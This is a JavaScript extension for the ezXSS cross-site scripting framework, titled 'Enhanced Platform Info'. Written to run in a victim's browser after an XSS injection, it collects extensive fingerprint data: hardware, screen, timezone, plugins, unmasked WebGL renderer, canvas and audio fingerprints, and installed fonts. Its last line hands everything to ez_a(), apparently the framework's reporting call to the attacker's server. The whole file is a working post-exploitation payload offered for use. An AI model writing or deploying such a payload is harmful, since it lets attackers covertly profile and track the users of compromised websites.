// <ezXSS extension>
// @name              Enhanced Platform Info
// @description       System and browser platform info with fingerprinting
// @author            ssl
// @version           1.0
// </ezXSS extension>

function getEnhancedInfo() {
    try {
        const info = {
            // Basic platform information
            platform: window.navigator.platform,
            language: window.navigator.language,
            languages: window.navigator.languages || [],
            cookiesEnabled: window.navigator.cookieEnabled,
            doNotTrack: window.navigator.doNotTrack,
            vendor: window.navigator.vendor,
            javaEnabled: window.navigator.javaEnabled ? window.navigator.javaEnabled() : false,
            
            // Screen and display information
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
            },
            
            // Viewport information
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio || 1,
                scrollX: window.scrollX,
                scrollY: window.scrollY
            },
            
            // Browser capabilities
            capabilities: {
                webglEnabled: !!window.WebGLRenderingContext,
                webgl2Enabled: !!window.WebGL2RenderingContext,
                webrtcEnabled: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection),
                geolocationEnabled: !!navigator.geolocation,
                notificationsEnabled: !!window.Notification,
                serviceWorkerEnabled: !!navigator.serviceWorker,
                webAssemblyEnabled: !!window.WebAssembly,
                indexedDBEnabled: !!window.indexedDB,
                localStorageEnabled: !!window.localStorage,
                sessionStorageEnabled: !!window.sessionStorage,
                webSocketEnabled: !!window.WebSocket,
                fetchEnabled: !!window.fetch,
                promiseEnabled: !!window.Promise,
                cryptoEnabled: !!(window.crypto && window.crypto.subtle),
                speechSynthesisEnabled: !!window.speechSynthesis,
                speechRecognitionEnabled: !!(window.SpeechRecognition || window.webkitSpeechRecognition)
            },
            
            // Time and timezone
            timezone: {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale
            },
            
            // Hardware information
            hardware: {
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connection: getConnectionInfo()
            },
            
            // Browser detection
            browser: detectBrowser(),
            
            // Plugin information
            plugins: getPluginInfo(),
            
            // WebGL fingerprinting
            webglFingerprint: getWebGLFingerprint(),
            
            // Canvas fingerprinting
            canvasFingerprint: getCanvasFingerprint(),
            
            // Audio fingerprinting
            audioFingerprint: getAudioFingerprint(),
            
            // Font detection
            fonts: detectFonts(),
            
            // Battery information (if available)
            battery: getBatteryInfo(),
            
            // Media devices
            mediaDevices: getMediaDevicesInfo()
        };
        
        return info;
    } catch (e) {
        return {
            error: e.message,
            timestamp: new Date().toISOString()
        };
    }
}

function getConnectionInfo() {
    try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData,
                type: connection.type
            };
        }
        return 'not available';
    } catch (e) {
        return 'error: ' + e.message;
    }
}

function detectBrowser() {
    const userAgent = navigator.userAgent;
    const browsers = {
        chrome: /Chrome\/(\d+)/.exec(userAgent),
        firefox: /Firefox\/(\d+)/.exec(userAgent),
        safari: /Safari\/(\d+)/.exec(userAgent),
        edge: /Edg\/(\d+)/.exec(userAgent),
        opera: /OPR\/(\d+)/.exec(userAgent),
        ie: /MSIE (\d+)/.exec(userAgent)
    };
    
    const detected = {};
    Object.keys(browsers).forEach(browser => {
        if (browsers[browser]) {
            detected.name = browser;
            detected.version = browsers[browser][1];
        }
    });
    
    detected.userAgent = userAgent;
    detected.appName = navigator.appName;
    detected.appVersion = navigator.appVersion;
    detected.product = navigator.product;
    
    return detected;
}

function getPluginInfo() {
    try {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            plugins.push({
                name: plugin.name,
                description: plugin.description,
                filename: plugin.filename,
                version: plugin.version || 'unknown'
            });
        }
        return plugins;
    } catch (e) {
        return 'error: ' + e.message;
    }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) {
            return 'WebGL not supported';
        }
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'not available',
            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'not available',
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
        };
    } catch (e) {
        return 'error: ' + e.message;
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test 🎨', 2, 2);
        ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
        ctx.fillRect(10, 10, 50, 50);
        
        return {
            dataURL: canvas.toDataURL(),
            hash: hashCode(canvas.toDataURL())
        };
    } catch (e) {
        return 'error: ' + e.message;
    }
}

function getAudioFingerprint() {
    try {
        if (!window.AudioContext && !window.webkitAudioContext) {
            return 'AudioContext not supported';
        }
        
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();
        
        oscillator.type = 'triangle';
        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        
        oscillator.connect(analyser);
        analyser.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.start(0);
        
        const frequencyData = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(frequencyData);
        
        oscillator.stop();
        audioContext.close();
        
        return {
            sampleRate: audioContext.sampleRate,
            maxChannelCount: audioContext.destination.maxChannelCount,
            numberOfInputs: audioContext.destination.numberOfInputs,
            numberOfOutputs: audioContext.destination.numberOfOutputs,
            channelCount: audioContext.destination.channelCount,
            frequencyDataHash: hashCode(Array.from(frequencyData).join(','))
        };
    } catch (e) {
        return 'error: ' + e.message;
    }
}

function detectFonts() {
    try {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
            'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
            'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Console',
            'Tahoma', 'Geneva', 'Lucida Sans Unicode', 'Franklin Gothic Medium',
            'Arial Narrow', 'Brush Script MT', 'Lucida Handwriting'
        ];
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        
        const baselines = {};
        baseFonts.forEach(font => {
            ctx.font = testSize + ' ' + font;
            baselines[font] = ctx.measureText(testString).width;
        });
        
        const detectedFonts = [];
        testFonts.forEach(font => {
            baseFonts.forEach(baseFont => {
                ctx.font = testSize + ' ' + font + ', ' + baseFont;
                const width = ctx.measureText(testString).width;
                if (width !== baselines[baseFont]) {
                    if (!detectedFonts.includes(font)) {
                        detectedFonts.push(font);
                    }
                }
            });
        });
        
        return detectedFonts;
    } catch (e) {
        return 'error: ' + e.message;
    }
}


function getBatteryInfo() {
    if (!navigator.getBattery) {
        return 'Battery API not supported';
    }
    
    return 'Battery API available';
}

function getMediaDevicesInfo() {
    if (!navigator.mediaDevices) {
        return 'MediaDevices API not supported';
    }
    
    return {
        supported: true,
        enumerateDevices: !!navigator.mediaDevices.enumerateDevices,
        getUserMedia: !!navigator.mediaDevices.getUserMedia,
        getDisplayMedia: !!navigator.mediaDevices.getDisplayMedia
    };
}

function hashCode(str) {
    let hash = 0;
    if (str.length === 0) return hash;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString();
}

ez_a(getEnhancedInfo());